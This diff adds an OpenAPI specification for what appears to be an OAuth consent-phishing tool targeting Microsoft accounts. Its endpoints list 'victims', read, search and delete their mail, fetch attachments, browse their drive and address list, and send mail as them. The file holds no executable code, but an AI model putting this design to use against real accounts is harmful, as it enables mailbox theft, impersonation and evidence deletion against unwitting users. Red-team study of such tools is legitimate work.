@@ -1,0 +1,432 @@
+{
+  "openapi": "3.0.0",
+  "servers": [    {
+      
+      "url": "https://{{ request.get_host }}/"
+    }
+  ],
+  "info": {
+    "version": "1.0-oas3",
+    "title": "Oauth-test",
+    "description": "Testing Oauth"
+  },
+  "paths": {
+    "/oauth/api/microsoft/victims": {
+      "get": {
+        "operationId": "victims::list",
+        "responses": {
+          "200": {
+            "description": "ok"
+          }
+        }
+      }
+    },
+    "/oauth/api/microsoft/victim/{victim_id}": {
+      "get": {
+        "operationId": "victim::get",
+        "responses": {
+          "200": {
+            "description": "ok"
+          }
+        },
+        "parameters": [
+          {
+            "name": "victim_id",
+            "required": true,
+            "in": "path",
+            "schema": {
+              "type": "string"
+            }
+          }
+        ]
+      }
+    },
+    "/oauth/api/microsoft/victim/{victim_id}/messages": {
+      "get": {
+        "operationId": "messages::list",
+        "responses": {
+          "200": {
+            "description": "ok"
+          }
+        },
+        "parameters": [
+          {
+            "name": "victim_id",
+            "required": true,
+            "in": "path",
+            "schema": {
+              "type": "string"
+            }
+          },
+          {
+            "name": "search",
+            "required": false,
+            "in": "query",
+            "schema": {
+              "type": "string"
+            }
+          },
+          {
+            "name": "next",
+            "required": false,
+            "in": "query",
+            "schema": {
+              "type": "string"
+            }
+          }
+        ]
+      }
+    },
+    "/oauth/api/microsoft/victim/{victim_id}/drive": {
+      "get": {
+        "operationId": "drive::list",
+        "responses": {
+          "200": {
+            "description": "test"
+          }
+        },
+        "parameters": [
+          {
+            "name": "victim_id",
+            "required": true,
+            "in": "path",
+            "schema": {
+              "type": "string"
+            }
+          },
+          {
+            "name": "search",
+            "required": false,
+            "in": "query",
+            "schema": {
+              "type": "string"
+            }
+          },
+          {
+            "name": "next",
+            "required": false,
+            "in": "query",
+            "schema": {
+              "type": "string"
+            }
+          }
+        ]
+      }
+    },
+    "/oauth/api/microsoft/victim/{victim_id}/message/{message_id}": {
+      "get": {
+        "operationId": "message::get",
+        "responses": {
+          "200": {
+            "description": "ok"
+          }
+        },
+        "parameters": [
+          {
+            "name": "victim_id",
+            "required": true,
+            "in": "path",
+            "schema": {
+              "type": "string"
+            }
+          },
+          {
+            "name": "message_id",
+            "required": true,
+            "in": "path",
+            "schema": {
+              "type": "string"
+            }
+          }
+        ]
+      },
+      "delete": {
+        "operationId": "message::delete",
+        "responses": {
+          "200": {
+            "description": "ok"
+          }
+        },
+        "parameters": [
+          {
+            "name": "victim_id",
+            "required": true,
+            "in": "path",
+            "schema": {
+              "type": "string"
+            }
+          },
+          {
+            "name": "message_id",
+            "required": true,
+            "in": "path",
+            "schema": {
+              "type": "string"
+            }
+          }
+        ]
+      }
+    },
+    "/oauth/api/microsoft/app_detail": {
+      "get": {
+        "operationId": "app::get",
+        "responses": {
+          "200": {
+            "description": "OK"
+          }
+        }
+      },
+      "post": {
+        "operationId": "app::create",
+        "responses": {
+          "201": {
+            "description": "added"
+          }
+        },
+        "requestBody": {
+          "content": {
+            "application/json": {
+              "schema": {
+                "$ref": "#/components/schemas/application"
+              }
+            }
+          }
+        }
+      }
+    },
+    "/oauth/api/microsoft/victim/{victim_id}/message/{message_id}/attachment/{attachment_id}": {
+      "get": {
+        "operationId": "attachment::get",
+        "responses": {
+          "200": {
+            "description": "ok"
+          }
+        },
+        "parameters": [
+          {
+            "name": "victim_id",
+            "required": true,
+            "in": "path",
+            "schema": {
+              "type": "string"
+            }
+          },
+          {
+            "name": "message_id",
+            "required": true,
+            "in": "path",
+            "schema": {
+              "type": "string"
+            }
+          },
+          {
+            "name": "attachment_id",
+            "required": true,
+            "in": "path",
+            "schema": {
+              "type": "string"
+            }
+          }
+        ]
+      }
+    },
+    "/oauth/api/microsoft/victim/{victim_id}/gal": {
+      "get": {
+        "operationId": "gal::get",
+        "responses": {
+          "200": {
+            "description": "ok"
+          }
+        },
+        "parameters": [
+          {
+            "name": "victim_id",
+            "required": true,
+            "in": "path",
+            "schema": {
+              "type": "string"
+            }
+          },
+          {
+            "name": "next",
+            "required": true,
+            "in": "path",
+            "schema": {
+              "type": "string"
+            }
+          }
+        ]
+      }
+    },
+    "/oauth/api/microsoft/victim/{victim_id}/message_send": {
+      "post": {
+        "operationId": "message::create",
+        "responses": {
+          "201": {
+            "description": "test"
+          }
+        },
+        "parameters": [
+          {
+            "name": "victim_id",
+            "required": true,
+            "in": "path",
+            "schema": {
+              "type": "string"
+            }
+          }
+        ],
+        "requestBody": {
+          "content": {
+            "application/json": {
+              "schema": {
+                "type": "object",
+                "properties": {
+                  "SaveToSentItems": {
+                    "description": "",
+                    "type": "boolean"
+                  },
+                  "Message": {
+                    "description": "",
+                    "$ref": "#/components/schemas/Message"
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+    }
+  },
+  "components": {
+    "schemas": {
+      "application": {
+        "type": "object",
+        "required": [
+          "name",
+          "redirect_url",
+          "client_id",
+          "authorization_url",
+          "token_url",
+          "client_secret",
+          "scopes",
+          "conclude_redirect"
+        ],
+        "properties": {
+          "name": {
+            "description": "Application name",
+            "type": "string"
+          },
+          "redirect_url": {
+            "description": "Redirect URL",
+            "type": "string"
+          },
+          "client_id": {
+            "description": "Client ID for application",
+            "type": "string"
+          },
+          "authorization_url": {
+            "description": "The OAuth provider Authorization URL",
+            "type": "string"
+          },
+          "token_url": {
+            "description": "The OAuth provider token URL",
+            "type": "string"
+          },
+          "client_secret": {
+            "description": "The application secret",
+            "type": "string"
+          },
+          "scopes": {
+            "description": "Application scopes",
+            "type": "string"
+          },
+          "conclude_redirect": {
+            "description": "Where to send users after granting auth",
+            "type": "string"
+          }
+        }
+      },
+      "Message": {
+        "type": "object",
+        "required": [
+          "subject",
+          "body"
+        ],
+        "properties": {
+          "subject": {
+            "type": "string"
+          },
+          "body": {
+            "type": "object",
+            "$ref": "#/components/schemas/body"
+          },
+          "toRecipients": {
+            "type": "array",
+            "items": {
+              "$ref": "#/components/schemas/recipient"
+            },
+            "minItems": 1
+          },
+          "ccRecipients": {
+            "type": "array",
+            "items": {
+              "$ref": "#/components/schemas/recipient"
+            }
+          },
+          "bccRecipients": {
+            "type": "array",
+            "items": {
+              "$ref": "#/components/schemas/recipient"
+            }
+          },
+          "replyTo": {
+            "type": "array",
+            "items": {
+              "$ref": "#/components/schemas/recipient"
+            }
+          },
+          "hasAttachments": {
+            "type": "boolean",
+            "default": false
+          }
+        }
+      },
+      "body": {
+        "type": "object",
+        "required" : [
+          "content",
+          "contentType"
+        ],
+        "properties": {
+          "contentType": {
+            "type": "string",
+            "enum": [
+              "Text",
+              "HTML"
+            ],
+            "default": "HTML"
+          },
+          "content": {
+            "type": "string",
+            "format": "textarea"
+          }
+        }
+      },
+      "recipient": {
+        "type": "object",
+        "properties": {
+          "emailAddress": {
+            "type": "object",
+            "properties" : {
+              "address" : {
+                "type": "string",
+                "format": "email"
+              }
+            }
+          }
+        }
+      }
+    }
+  }
+}
